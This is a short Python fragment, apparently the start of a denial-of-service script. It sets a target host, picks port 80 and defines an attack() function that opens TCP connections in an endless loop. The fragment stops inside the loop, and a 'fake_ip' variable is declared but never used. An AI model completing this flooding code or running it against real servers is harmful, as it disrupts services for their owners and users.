import threading
import socket 

target = ""

# port 22 ssh
# port 80 http port

port = 80

fake_ip = ""

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
